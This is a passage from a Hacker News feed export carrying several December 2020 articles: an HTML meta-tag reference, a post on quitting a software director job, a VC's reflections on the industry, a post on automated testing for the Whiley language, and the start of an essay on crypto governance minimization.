    <span><span><span>&lt;</span>meta</span> <span>name</span><span><span>=</span><span>"</span>og:video:width<span>"</span></span> <span>content</span><span><span>=</span><span>"</span>Video Width i.e. 100px<span>"</span></span><span>&gt;</span></span>
    <span><span><span>&lt;</span>meta</span> <span>name</span><span><span>=</span><span>"</span>og:video:height<span>"</span></span> <span>content</span><span><span>=</span><span>"</span>Video Height i.e. 200px<span>"</span></span><span>&gt;</span></span>
    <span><span><span>&lt;</span>meta</span> <span>name</span><span><span>=</span><span>"</span>og:video:image<span>"</span></span> <span>content</span><span><span>=</span><span>"</span>Placeholder image for video<span>"</span></span><span>&gt;</span></span>
</code></pre>
<h3>Social Media 3d Asset</h3>
<pre><p>html <span>Copy</span></p><code>
    <span><span><span>&lt;</span>meta</span> <span>property</span><span><span>=</span><span>"</span>og:type<span>"</span></span> <span>content</span><span><span>=</span><span>"</span>threed.asset<span>"</span></span><span>&gt;</span></span> 
    <span><span><span>&lt;</span>meta</span> <span>property</span><span><span>=</span><span>"</span>og:asset<span>"</span></span> <span>content</span><span><span>=</span><span>"</span>/link/to/asset.glb<span>"</span></span><span>&gt;</span></span>
    <span><span><span>&lt;</span>meta</span> <span>property</span><span><span>=</span><span>"</span>og:title<span>"</span></span> <span>content</span><span><span>=</span><span>"</span>Title of asset<span>"</span></span><span>&gt;</span></span>
</code></pre>
                
            </div>
            
        </article>
    </section></div>]]>
            </description>
            <link>https://fjolt.com/article/meta-tag-ref-html-quick-start</link>
            <guid isPermaLink="false">hacker-news-small-sites-25511860</guid>
            <pubDate>Tue, 22 Dec 2020 22:06:09 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[I quit my high-paying job as a software director]]>
            </title>
            <description>
<![CDATA[
Score 8 | Comments 2 (<a href="https://news.ycombinator.com/item?id=25511668">thread link</a>) | @mojoe
<br/>
December 22, 2020 | https://cloudconsultant.dev/i-quit-my-high-paying-job-as-a-software-director/ | <a href="https://web.archive.org/web/*/https://cloudconsultant.dev/i-quit-my-high-paying-job-as-a-software-director/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div id="site-main">
    <div>

        <article>

            

            <figure>
                <img srcset="https://images.unsplash.com/photo-1456030680012-9aa5bd962cc4?crop=entropy&amp;cs=tinysrgb&amp;fit=max&amp;fm=jpg&amp;ixid=MXwxMTc3M3wwfDF8c2VhcmNofDIzfHxvcGVuJTIwcm9hZHxlbnwwfHx8&amp;ixlib=rb-1.2.1&amp;q=80&amp;w=2000 300w,
                            https://images.unsplash.com/photo-1456030680012-9aa5bd962cc4?crop=entropy&amp;cs=tinysrgb&amp;fit=max&amp;fm=jpg&amp;ixid=MXwxMTc3M3wwfDF8c2VhcmNofDIzfHxvcGVuJTIwcm9hZHxlbnwwfHx8&amp;ixlib=rb-1.2.1&amp;q=80&amp;w=2000 600w,
                            https://images.unsplash.com/photo-1456030680012-9aa5bd962cc4?crop=entropy&amp;cs=tinysrgb&amp;fit=max&amp;fm=jpg&amp;ixid=MXwxMTc3M3wwfDF8c2VhcmNofDIzfHxvcGVuJTIwcm9hZHxlbnwwfHx8&amp;ixlib=rb-1.2.1&amp;q=80&amp;w=2000 1000w,
                            https://images.unsplash.com/photo-1456030680012-9aa5bd962cc4?crop=entropy&amp;cs=tinysrgb&amp;fit=max&amp;fm=jpg&amp;ixid=MXwxMTc3M3wwfDF8c2VhcmNofDIzfHxvcGVuJTIwcm9hZHxlbnwwfHx8&amp;ixlib=rb-1.2.1&amp;q=80&amp;w=2000 2000w" sizes="(max-width: 800px) 400px,
                        (max-width: 1170px) 1170px,
                            2000px" src="https://images.unsplash.com/photo-1456030680012-9aa5bd962cc4?crop=entropy&amp;cs=tinysrgb&amp;fit=max&amp;fm=jpg&amp;ixid=MXwxMTc3M3wwfDF8c2VhcmNofDIzfHxvcGVuJTIwcm9hZHxlbnwwfHx8&amp;ixlib=rb-1.2.1&amp;q=80&amp;w=2000" alt="I quit my high-paying job as a software director">
            </figure>

            <section>
                <div>
                    <p>At the end of October I quit my job as a director of software engineering. Many (most?) people view this as insane given the amount of money I was making. I'm not going to give a precise figure here, but if you're really curious you can check out software director salaries on <a href="https://www.levels.fyi/">levels.fyi</a>. I was making enough that in another 5-10 years I could very comfortably retire with a reasonably high standard of living.</p><h3 id="working-on-my-own-terms">Working on my own terms</h3><p>So why did I leave this behind? The concept is simple – I want to see how it feels to work on my own terms. I know how that sounds. If you've hung out for any period of time in tech-oriented communities like Hacker News it's likely that you've seen at least a few posts about people losing motivation at their high-paying tech jobs and wanting to strike out on their own. I always felt a little cognitive dissonance over those posts. On the one hand I completely identified with the desire to firmly seize control of my time and spend it on things that I wanted to do, but I also had this voice in the back of my head that said, "What a ridiculous first-world problem. Sure, other people set their priorities, but they have a pretty high degree of freedom compared to other roles and industries, so they should be thankful for what they've got. Why risk it?"</p><p>Everyone's situation is unique, but I think in my case the downside is limited. At the risk of sounding overconfident, I am very good at my job, and if things go south I believe I can join a large software organization again. The upside is that I can work on lots of different projects, spend more time with my family, and build things that I want to build.</p><h3 id="kids">Kids</h3><p>A huge reason for leaving was that my second child was recently born, and my company had no official paternity leave (if a company is small enough they're not bound by FMLA). With the pandemic raging and my toddler cooped up in the house, I wanted to spend more time with my toddler so my wife could focus on our new son.</p><p>This has been going fantastically so far. We're spending time outside, getting exercise, playing games, and making progress on simple academics. If my wife had to take care of a two year old and a newborn by herself with no support during the workday it would have been a nightmare.</p><p>It can be occasionally tedious (two year olds aren't the most sophisticated conversationalists), and we are all looking forward to the day where my daughter can engage more fully with other kids, go back to the rec center and library, travel with us, etc, but for now our schedule works. I'm very much enjoying our time together.</p><h3 id="financial-stability">Financial stability</h3><p>I don't have the funds to retire – this post would read very differently if I did. I have enough savings to feel secure, but it will be necessary for me to take on contract projects to support my family.</p><p>I may write another post on the financial details of working freelance down the road, but if you're interested in the types of expenses I took into account when quitting Daniel Vassallo has a fantastic post on it: <a href="https://danielvassallo.com/from-employee-to-bootstrapper/">https://danielvassallo.com/from-employee-to-bootstrapper/</a></p><p>I'm currently paying for COBRA health insurance through my old employer, and in general it was important to me that all my insurance coverages continue uninterrupted. I think that the most important points that Daniel emphasizes are ways to avoid financial ruin when you no longer have many of the safety nets that come with large tech employers.</p><h3 id="what-s-next">What's next?</h3><p>I've already started contracting! I have a fairly broad network of friends that I've developed over the last decade in tech, and for now I'm happy sharing my expertise with them and helping to build new products.</p><h3 id="this-blog">This blog</h3><p>I've always enjoyed writing about things I'm interested in and helping others level up their skills. This blog, cloudconsultant.dev, will be focused on news about the major cloud providers (AWS, Azure, and GCP), along with comparisons between the platforms and tips and tricks I've learned while building enterprise software in the cloud. I'm hoping you'll find it easy to read and educational. My secondary objective is to build a conduit to meet potential clients who need help with their cloud projects.</p><p>Please feel free to reach out if you have cloud questions! I'll be looking for interesting cloud topics to post about every week. I plan on making conversational-style posts that will help you keep up to date in a less painful way than just reading Amazon/Microsoft/Google press releases.</p><p>My next post will be a recap of the major cloud feature releases of 2020 – if that sounds interesting, sign up for my mailing list below!</p><p>Until next time,</p><p>Joe</p>
                </div>
            </section>

                <section>
    <h3>Subscribe to The Cloud Consultant</h3>
    <p>Get the latest posts delivered right to your inbox</p>
    <form data-members-form="subscribe">
        
        <p><strong>Great!</strong> Check your inbox and click the link to confirm your subscription.
        </p>
        <p>
            Please enter a valid email address!
        </p>
    </form>
</section>

        </article>

    </div>
</div></div>]]>
            </description>
            <link>https://cloudconsultant.dev/i-quit-my-high-paying-job-as-a-software-director/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25511668</guid>
            <pubDate>Tue, 22 Dec 2020 21:47:54 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[What VC can learn from Bridgewater and journalism]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25511481">thread link</a>) | @smalera
<br/>
December 22, 2020 | https://www.businessofbusiness.com/articles/i-went-from-a-hedge-fund-to-journalism-to-venture-capital-heres-what-my-new-industry-can-do-better/ | <a href="https://web.archive.org/web/*/https://www.businessofbusiness.com/articles/i-went-from-a-hedge-fund-to-journalism-to-venture-capital-heres-what-my-new-industry-can-do-better/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div id="main-section">
    <!-- .sidebar -->

    <section>
      
      

      <p id="d91a">People often ask me how I got into VC. It’s a difficult question to answer because the truth isn’t sexy or fun. Getting hired in VC was a winding, frustrating, and often draining process during which I repeatedly convinced myself this wasn’t the path I wanted to take, then reignited interest. I’m happy to share the nitty gritty with anyone who asks. While I was lucky to have a few investors believe in me, more often than not, interview processes left me exhausted and underwhelmed.</p>
<p id="774c">When I wasn’t “<span id="rmm"><span id="rmm"><span id="rmm"><span id="rmm"><span id="rmm"><span id="rmm"><span id="rmm"><span id="rmm"><span id="rmm"><span id="rmm"><span id="rmm">l</span></span></span></span></span></span></span></span></span></span></span>ooking,” the opportunity to join<span>&nbsp;</span><a href="http://nextviewventures.com/" rel="noopener nofollow">NextView Ventures</a><span>&nbsp;</span>arrived. Getting an offer was a tremendous privilege; I do not take it lightly, and I know my gain was the loss of other candidates who were likely equally if not more qualified. Now two months into the job, I’ve spent a good deal of time reflecting on what would be helpful to share about my early days in venture. There are many resources available on how to get into venture, and millions of “what I’ve learned in my first 60 days as a VC” posts. Instead of contributing to the noise, I decided to get real and share what I’m still struggling with. Which is a lot!</p>
<p id="ba3b">Non-partner venture roles are not easy. They’re high pressure, often no- or low carry, and quite vague. You enter not knowing what you’re supposed to do, and you’re rarely presented with a manual. I tend to gauge my professional confidence based on how frequently I use the word “should” — a trick I learned in therapy. My therapist flags when I’m speaking about what I “should” be doing or feeling, as opposed to what I am doing, feeling, or thinking. After two months in venture, I’m saying “should” a lot.</p>
<p id="65b0">I share this reality not to downplay my abilities or the support of my team — which is amazing. Nor am I embarrassed by my “should”-ing; it’s a sign that I’m pursuing an opportunity that makes me uncomfortable, and that’s a sign I’m learning. Those who aren’t should-ing have either been at this way longer than I have, or they’re lying. I don’t enjoy being bored, and believe that life is too short to stay professionally comfortable.</p>
<p id="d1cb">I’m being honest about my insecurities and confusions because after cutting my teeth at Bridgewater Associates, one of the most radically transparent workplaces, and building a journalism career rooted in “<a href="https://qz.com/1515462/vulnerability-is-the-key-to-good-sex-and-happiness/" rel="noopener nofollow">vulnerability at scale</a>,” I know that pretending you know it all gets you nowhere. I also know that I’m not the only one struggling, and that as a white woman I have an added privilege to speak up.</p>
<p id="9bd1">Alas, I’ve put together the top things I’m not getting about VC. Perhaps it’s because I’m undereducated or inexperienced, or perhaps it’s because these things truly don’t make sense and should change. Either way, I’d love to hear your thoughts.</p>
<h2>We’re all doing the same thing but we’re sketchy about collaboration</h2>
<p>I work at a seed stage fund. I think it’s a wonderful, brilliant fund, with a differentiated perspective and smart humans. That’s true of pretty much every other seed stage fund, too. Many of us are qualified and smart. We’re all hungry for the best deals. Most of us are looking at the same deals. Yet more often than not, we avoid collaboration and keep our cards close to our chests.</p>
<p id="c0e4">This strikes me as a bit… wild. Not because I am an idiot — I know we cannot all win, and that inviting everyone to your party can amplify competition. This is especially true for partners, as they’re the ones making the calls and setting the terms. But for junior VCs, I think it’s a different story. We’ve open-sourced everything in tech beyond our own success. For many of us, our incentive is to see and surface as many of the best deals as possible. Economies of scale would make all our lives a lot easier.</p>
<p id="0bf7">I’m not suggesting that all junior VCs create a shared spreadsheet, but hey, it’s an “extreme” concept worth contemplating. All I’m saying is that over the past two months, I’ve made a concerted effort to reach out to seemingly high-quality non-partner investors, genuinely get to know them, and make it clear that I’m pro-collaboration. I come from newsrooms and early-stage startups, where our team’s success depends on our ability to collectively source news, ideas, and facts. I intend to take the same approach to venture among those I trust, and those who trust me. I believe our inherent fear of showing our cards is holding us back — especially women and people of color.</p>
<h2 id="0d14">We’re very quick to jump to why it won’t work</h2>
<p>A common junior VC experience is being amped up after a first call, bringing the company to a partner, and facing either crickets or an immediate no. Cringeworthy as this experience is, I kind of love it. Getting slapped around a bit hardens your skin and encourages you to come prepared. Tough love is love nonetheless.</p>
<p id="088e">That being said, I’m a bit confused by intense skepticism as a form of social currency in this industry. Since my first days reporting on then interviewing with VC partners, I’ve noticed that the ability to quickly (if not instantaneously) call out what’s wrong with a founder’s idea or vision is often equated with intelligence. I find that ironic given our charge is to bet on what’s possible. Rarely does the future match our predictions, which ought to encourage us to see beyond our squints.</p>
<p id="508b">Healthy skepticism is undoubtedly key to success. As many folks have said, we’re in the business of saying no. What irks me as someone coming in with fresh eyes is how rarely we emphasize that we’re also in the business of saying yes. Of making visions that seem impossible come true.</p>
<p id="15dd">This isn’t a call for blind pipe dreams. My parents nicknamed me Eeyore at age five; I quite enjoy pessimism. Rather, it’s a call for asking how “might” this business succeed before talking about what they “should’ be doing differently.</p>
<p id="f96d">If partners want to groom their junior teammates into nuanced investors, they’d be smart to push the conversation toward what is good or exciting about a business before shooting it down. This is a skill NextView partners come to naturally, for which I’m extremely lucky. When I present an idea — no matter how poorly — they ask what I like about it, and respond to my enthusiasm with questions and comments, rather than immediate critique. They ask why before saying no. What’s more, when they do say no, they distinguish between a “this isn’t for us, but here’s the squint of how I could see it working,” and a “no, this has a fatal flaw, and it’s X.” Even if the ultimate decision is a pass, this approach helps me learn rather than scaring me into silence. I know I speak for more than myself when I say immediate and unqualified rejection isn’t motivating or educative.</p>
<h2 id="d8a4">Kindness and honesty feel more important than “being helpful”</h2>
<p id="e64b">All seed funds want to differentiate from other seed funds. Service offerings intended to “be helpful” to founders are a common refrain. We ask what we can do to “add more value,” convincing ourselves that semi-delusional navel gazing is productive. I don’t mean to shoot down service offerings — many are impressive and convert deals. But I’m unsure whether, on an individual investor level, “being helpful” is more important than being kind and real.</p>
<p id="8463">To reiterate, I’ve been at this for two months and am a<span>&nbsp;</span><a href="https://qz.com/work/1294686/bridgewater-associates-ceo-ray-dalios-advice-to-college-and-high-school-graduates-you-know-nothing/" rel="noopener nofollow">Dalio-certified “dumb shit.”</a><span>&nbsp;</span>However, with the founders I’ve met through NextView and as an angel, it seems the most helpful thing I can do is to tell them the truth and not be an asshole. Founders are engaging with VCs for money not for fun or new buddies. Our job is to give them that money or get out of the way, while also convincing them that our experience giving other people money makes us a valuable sounding board and differentiates our undifferentiated capital.</p>
<p id="46ad">When we write rejection or mid-deal emails, we ought to focus less on value-add platitudes and more on honesty: What’s good about the founders’ business, and what’s not working in our eyes. Admission that we could be wrong. The truth about why can or can’t we “get there” — founders have thick skin, they can handle it. What would need to be different for us to have more conviction in this business? Where might we be ignorant of our own blinders. This feedback does take a minute or two extra, but somewhat counterintuitively, it results in higher trust, which translates to founders sending more information and more deals — even if you pass on them.</p>
<p id="1f1f">Perhaps most importantly, both in founder and intra-fund relationships, our honesty should not outweigh kindness and respect. It confuses me when people think being mean or hyper-intense makes them powerful, when in fact, it makes you seem insecure. As investors and teammates, I think we’ll win by being good people — by being genuinely invested in one another’s success (pun intended), and open-minded enough to listen to one another’s perspectives. At NextView we tend to believe that our team’s brain trust is worth more than its independent parts. The same goes for the founders we meet, inclusive of those we pass on. Confidence comes from conversation and consideration, not from being right.</p>
<p id="bcf3"><em>If these reflections resonate, feel free to let me know<span>&nbsp;</span></em><a href="https://twitter.com/LeahFessler" rel="noopener nofollow"><em>@LeahFessler.</em></a><em><span>&nbsp;</span>If not, be kind.</em></p>
<p id="1814"><em>Thank you to<span>&nbsp;</span></em><a href="https://twitter.com/jay_drainjr" rel="noopener nofollow"><em>Jay Drain Jr.</em></a><em><span>&nbsp;</span>and<span>&nbsp;</span></em><a href="https://twitter.com/davidbeisel" rel="noopener nofollow"><em>David Beisel</em></a><em><span>&nbsp;</span>for reading my drafts. I appreciate you.</em></p>
<p><em>This post originally appeared on <a href="https://leahmfessler.medium.com/ive-been-in-venture-capital-for-two-months-here-s-what-still-makes-no-sense-f9e3b28668f9">Medium</a> and is republished here with the author's permission.</em></p>
      

      

      



    </section><!-- .article-body -->

    
  </div></div>]]>
            </description>
            <link>https://www.businessofbusiness.com/articles/i-went-from-a-hedge-fund-to-journalism-to-venture-capital-heres-what-my-new-industry-can-do-better/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25511481</guid>
            <pubDate>Tue, 22 Dec 2020 21:30:55 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[QuickCheck for Whiley]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25511412">thread link</a>) | @todsacerdoti
<br/>
December 22, 2020 | https://whileydave.com/2020/12/02/automated-testing-for-whiley/ | <a href="https://web.archive.org/web/*/https://whileydave.com/2020/12/02/automated-testing-for-whiley/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div onclick="clearMenu()"><div><p>Wednesday, December
2nd,
2020</p><hr><p>Recently, the <a href="http://whileylabs.com/">online editor for Whiley</a> was updated with some new features. Actually, the update represents a <em>complete rewrite of the front-end in Whiley</em>. Obviously, I am very excited about that! Previously it was written using raw (i.e. ugly) JavaScript, but now uses a framework for <a href="https://www.youtube.com/watch?v=yYGEcyCHiZk">Functional Reactive Programming</a> (called <a href="https://github.com/DavePearce/Web.wy">Web.wy</a>). That has made a huge difference to how the code looks. Still, I’m not going to talk about that here. Rather, it is the new <em>check</em> feature (highlighted in red below) that I’m interested in:</p><figure><a href="http://whileylabs.com/"><img width="80%" alt="Illustrating a screenshot of whileylabs.com with the check option highlighted." src="https://whileydave.com/images/2020/AutomatedTesting_WhileyLabs.png"></a></figure><p><em>What is this new “check” feature then?</em> In a nutshell, it automatically generates test inputs for functions and runs them through the code looking for problems (e.g. <em>divide-by-zero</em>, <em>index-out-of-bounds</em>, etc). In many ways, it is similar to the <a href="https://en.wikipedia.org/wiki/QuickCheck">QuickCheck</a> line of tools (with the added benefit that Whiley has first-class specifications). We can think of it as a “half-way” step towards formal verification. The key is that it is easier to check a program than it is to statically verify it (more on this below). Some might think that having a check feature like this doesn’t make sense when you also have static verification. But, I prefer to think of them as <em>complementary</em>. Thinking about a developer’s workflow, we might imagine checking a function first as we develop it (since this is easier and quicker) before, finally, attempting to statically verify it (since this is harder and may force the specification to be further refined).</p><h2 id="example">Example</h2><p>As a simple example to illustrate how it works, consider the following
signature for the <code>max(int[])</code> function:</p><div><pre><code data-lang="c">function <span>max</span>(<span>int</span>[] items) <span>-&gt;</span> (<span>int</span> r)
<span>// items cannot be empty
</span><span></span>requires <span>|</span>items<span>|</span> <span>&gt;</span> <span>0</span>
<span>// result not smaller than any in items
</span><span></span>ensures all { i in <span>0.</span>.<span>|</span>items<span>|</span> <span>|</span> r <span>&gt;=</span> items[i] }
<span>// result is element in items
</span><span></span>ensures some { i in <span>0.</span>.<span>|</span>items<span>|</span> <span>|</span> r <span>==</span> items[i] }<span>:</span>
   ...
</code></pre></div><p>We’re not really concerned with the implementation here (and we can
assume it might have bugs). To check this function, the tool will do
the following:</p><ol><li><p><strong>(Generate)</strong> The tool generates some number of valid inputs.
That is, input values which meet the precondition. For our example
above, that is any <code>int[]</code> array containing at least one element.</p></li><li><p><strong>(Execute)</strong>. The function in question is then executed using
each of the generated inputs. This may lead to obvious failures
(e.g. out-of-bounds or divide-by-zero errors), in which case we’ve
already found some bugs!</p></li><li><p><strong>(Check)</strong>. For any execution which completed, the tool then
checks the result against the postcondition. If the postcondition
doesn’t hold then, again, this indicates a bug somewhere.</p></li></ol><p>The key is that the specification acts as the <a href="https://en.wikipedia.org/wiki/Test_oracle">test
oracle</a>. In other words,
<em>having written the specification we get testing for free</em>! And, the
tool takes care of the difficult stuff so we don’t have to. For
example, generating valid inputs efficiently is harder than it looks
(more on this below).</p><h2 id="technical-stuff">Technical Stuff</h2><p>The main technical challenge is that of efficiently generating <em>input
values under constraints</em>. To start with, we can generate raw input
values for the various data types in Whiley:</p><ul><li><p><strong>Primitives.</strong> These are pretty easy. For example, to generate
values of type <code>int</code>, we’ll use some (configurable) domain
(e.g. <code>-2 .. 2</code>) of values. We can easily sample uniformly
from this domain as well (e.g. using Knuth’s <a href="https://rosettacode.org/wiki/Knuth%27s_algorithm_S">Algorithm
S</a>).</p></li><li><p><strong>Arrays</strong>. Here, we limit the maximum length of an array
(e.g. length <code>2</code>), and then enumerate all arrays upto this
length. To generate values in the array, we recursively call
the generator associated with the element type. For the array
type <code>int[]</code> and assuming max length <code>2</code> and integers <code>-1..1</code>,
we might generate: <code>[]</code>, <code>[-1]</code>, <code>[0]</code>, <code>[1]</code>, <code>[-1,-1]</code>,
<code>[0,-1]</code>,<code>[1,-2]</code>, etc.</p></li><li><p><strong>Records</strong>. These are similar, except there is no maximum
length. For each field, we recursively generate values using
the generator associated with its type. For the record type
<code>{bool flag, int data}</code> and assuming and integers <code>-1..1</code>, we
might generate: <code>{flag:false,data:-1}</code>, <code>{flag:true,data:-1}</code>,
<code>{flag:false,data:0}</code>, <code>{flag:true,data:0}</code>,
<code>{flag:false,data:1}</code>, etc.</p></li><li><p><strong>References</strong>. These are more tricky as we must allow for
aliasing between heap locations. For a single reference type
<code>&amp;int</code>, we generate heap locations for each of the possible
integer values. However, for two reference types
(e.g. parameters <code>&amp;int x, &amp;int y</code>), we have to additionally
consider both the <em>aliased</em> and <em>non-aliased</em> cases.</p></li><li><p><strong>Lambdas</strong>. These are very challenging as, in principle, it
requires enumerating all implementations of a function!
Consider the lambda type <code>function(int)-&gt;(int)</code> — <em>how do we
generate values (i.e. implementations) of this type?</em> There is
no easy answer here, but there are some strategies we can use.
Firstly, we can scour the source program looking for functions
with the same signature. Secondly, we can generate simple
input/output mappings (e.g. <code>{-1=&gt;-1, 0=&gt;0, 1=&gt;1}</code>). We can go
beyond this by applying <em>rotations</em> (e.g. <code>{-1=&gt;0, 0=&gt;1, 1=&gt;-1}</code>).</p></li></ul><p>Given the ability to generate arbitrary values for a type, the more
difficult question is how to generate values which meet some
constraint. For example, consider this data type:</p><div><pre><code data-lang="c">type List<span>&lt;</span>T<span>&gt;</span> is {
     <span>int</span> length,
     T[] items
}
where <span>0</span> <span>&lt;=</span> length
where length <span>&lt;=</span> <span>|</span>items<span>|</span>
</code></pre></div><p>The current approach we take is rather simplistic here. We simply
generate all values of the <em>underlying type</em> and discard those which
don’t satisfy the invariant. This works, but it has some problems:</p><ol><li><p><em>(Scale)</em>. Enumerating all values of a complex data type upto a
given bound can be expensive. We might easily need to generate
<em>1K</em>, <em>10K</em>, <em>100K</em> (or more) values, of which only a tiny
fraction may satisfy our invariant. For our <code>List</code> example
above, assuming a maximum array length of <code>3</code> and integer range
<code>-3..3</code>, there are <em>2800</em> possible values of the underlying type
of which only <em>1534</em> meet the invariant (55%). That’s not too
bad, but as we get more invariants this changes quite quickly.
Consider this example taken from an implementation of <a href="https://en.wikipedia.org/wiki/Tarjan%27s_strongly_connected_components_algorithm">Tarjan’s
algorithm</a>
for computing <em>strongly connected compoenents</em>:</p><div><pre><code data-lang="c">type Data is {
  <span>bool</span>[] visited,
  <span>int</span>[] lowlink,
  <span>int</span>[] index
}
where <span>|</span>visited<span>|</span> <span>==</span> <span>|</span>lowlink<span>|</span>
where <span>|</span>lowlink<span>|</span> <span>==</span> <span>|</span>index<span>|</span>
</code></pre></div><p>In this case, there are
<em>2.4M</em> values of the underlying type, of which only <em>946K</em> match
the invariant (39%). And, as we add more invariants (e.g. that
no element in <code>lowlink</code> can be negative) this ratio continues a
downward trend.</p></li><li><p><em>(Sampling)</em>. Another interesting issue arises with sampling.
Typically, we want to sample from large domains (i.e. rather
than enumerate them) to allow checking in reasonable time. The
problem is that, for complex data types with invariants, the
probability that a given value sampled from the underlying
domain meets the invariant is often very low. We have observed
situations where sampling <em>1K</em> or <em>10K</em> values from such a
domain produced <em>exactly zero</em> values meeting the invariant. In other
words, it was completely useless in these cases (though not in others).</p></li></ol><p>Whilst these may seem like serious problems, they stem from the
simplistic fashion in which we generate values for constrained types.
Actually, it is possible to generate values of constrained types directly
(i.e. without enumerating those of the underlying type) and
efficiently. The next evolution of the check functionaliy will implement
this and, hopefully, it will offer some big improvements.</p><h2 id="pros--cons">Pros / Cons</h2><p>There are several advantages to checking over static verification,
some of which may be unexpected:</p><ul><li><p><em>(Incomplete Specifications)</em>. We can check our programs even
when the specifications are incomplete. Suppose we are
developing two functions in tandem, say <code>max(int[])</code> which uses
<code>max(int,int)</code> as a subroutine. With static verification, we
cannot verify <code>max(int[])</code> before we have specified and verified
<code>max(int,int)</code>. However, we can start checking <code>max(int[])</code> as
soon as we have implementated <code>max(int,int)</code> (i.e. since
checking just executes it).</p></li><li><p><em>(Loop Invariants)</em>. We can check our programs without writing
any loop invariants. Since writing loop invariants can be
challenging, this is an important benefit. With static
verification, we cannot verify a function containing a loop
without correctly specifying the loop invariant first. That can
be a real pain, especially in the early stages of developing a
program.</p></li><li><p><em>(Counterexamples)</em>. Whenever checking finds a problem in our
program, it will also tell you the input values causing it and,
furthermore, they always correspond to real failures in your
program. Static verification, on the other hand, cannot always
generate an execution trace and, even when it does, they are not
always <em>realisable</em> traces of the program. That can make life
quite frustrating!</p></li></ul><p>Of course, there are some disadvantages with checking as well. Most
importantly, checking doesn’t guarantee to find all problems with your
program! But, in our experience, it usually finds most of them.
There are also problems (discussed above) with generating enough
values for complex data types to properly test our functions.</p><h3 id="conclusion">Conclusion</h3><p>Overall, despite some limitations, we find checking to be incredibly
useful — <em>especially as its free</em>. Here’s a short demo to give you
a taste:</p><center><iframe src="https://www.youtube.com/embed/d_liFzxlpjA" width="560" height="315" frameborder="0" allow="accelerometer; autoplay; encrypted-media; gyroscope; picture-in-picture" allowfullscreen=""></iframe></center><p>So, head on over to the <a href="http://whileylabs.com/">online editor for
Whiley</a> and give it a go!</p><hr><p><i>Follow the discussion on
<a href="https://twitter.com/whileydave/status/1341215592733274112">Twitter</a>
or
<a href="https://www.reddit.com/r/programming/comments/khwdyb/automated_testing_for_free/">Reddit</a></i></p></div></div></div>]]>
            </description>
            <link>https://whileydave.com/2020/12/02/automated-testing-for-whiley/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25511412</guid>
            <pubDate>Tue, 22 Dec 2020 21:24:03 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Networking for Future Founders]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25511342">thread link</a>) | @rpicard
<br/>
December 22, 2020 | https://www.robert.io/networking-for-future-founders | <a href="https://web.archive.org/web/*/https://www.robert.io/networking-for-future-founders">archive.org</a>
<br/><!-- hnss:readable-content --><hr/>Unable to extract article]]>
            </description>
            <link>https://www.robert.io/networking-for-future-founders</link>
            <guid isPermaLink="false">hacker-news-small-sites-25511342</guid>
            <pubDate>Tue, 22 Dec 2020 21:16:03 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Governance Minimization]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25511275">thread link</a>) | @varunsrin
<br/>
December 22, 2020 | https://www.fehrsam.xyz/blog/governance-minimization | <a href="https://web.archive.org/web/*/https://www.fehrsam.xyz/blog/governance-minimization">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div data-block-type="2" id="block-yui_3_17_2_1_1606457505557_58547"><div><h3><em>"The best government is that which governs least"</em> <em>— Unknown</em></h3><h3>co-authored by Dan Robinson</h3><p>Those who read my blockchain governance <a href="https://medium.com/@FEhrsam/blockchain-governance-programming-our-future-c3bfe30f2d74">post</a> from 2017 know I was excited about crypto exploring different forms of governance, especially on-chain governance. In the 3 years since, on-chain governance has gone from obscure to a popular component of many important protocols. Despite this traction, I think <strong>the most widely used protocols will trend towards governance minimization</strong>.<br>Why? Governance minimization allows stakeholders to depend on a protocol. This creates a virtuous cycle of adoption, enabling scale that would otherwise be unachievable. Look no further than successful traditional internet protocols like HTTP and SMTP to see this power today. Their governance minimization has allowed them to become standards everyone depends on, generating levels of use far exceeding what any company could achieve.<br>This post explains governance minimization, where governance remains important, and speculates on implications.</p><p><strong>Governance minimization<br></strong>Governance minimization means reducing the power and reliance on governance wherever possible.<br>Governance minimization is important because it supports the primary value proposition of protocols: credible neutrality. Minimizing governance tends to make protocols more credibly neutral.<br>In practice today, governance minimization most directly applies to minimizing on-chain governance. If a protocol wants to achieve maximum adoption and can avoid using governance for a function, it should do so.</p><p><strong>What is credible neutrality?<br></strong>Credible neutrality is dependability. It means a stakeholder (e.g a user or a developer) can use or build on a protocol with confidence it will <a href="https://nakamoto.com/credible-neutrality/">not change against their interests</a>. Protocols remain credibly neutral by avoiding "capture" by any particular group.</p><p><strong>Why is credible neutrality important?<br></strong>Credible neutrality is primary value proposition of crypto today. It's what allows for new forms of open and predictable money. It's what creates platforms where anyone can openly create and access new applications.<br>Lack of credible neutrality in existing platforms makes its importance clear. Central banks are not credibly neutral as platforms for money because a subset of stakeholders can decide to print money at will. Facebook and Twitter are not credibly neutral as platforms for applications because a subset of stakeholders can make changes that kill entire developer ecosystems.<br>It creates safety of value locked in a platform — both concrete (funds) and abstract (development time, users) — from theft, shutdown, and restriction.<br>A total failure of credible neutrality is an exit scam. Some stakeholders of a platform can abscond, in part or in whole, with the value other stakeholders own or have created. A literal example is a centralized crypto exchange operator running off with user funds. An abstract example is Twitter shutting down third party developer interfaces to enshrine the interface of Twitter Inc.</p><p><strong>What governance minimization is <em>not<br></em></strong>Governance minimization is <em>not</em> the idea that governance can or should go away entirely. In fact, this is impossible! There are some protocol functions that are hard or impossible to perform without governance ("essential governance", more on this later). And at a minimum, governance always exists through the ability to coordinate socially ("informally") and hard fork.</p><p><strong>Governance minimization creates more neutral protocols<br></strong>Creating a perfect governance 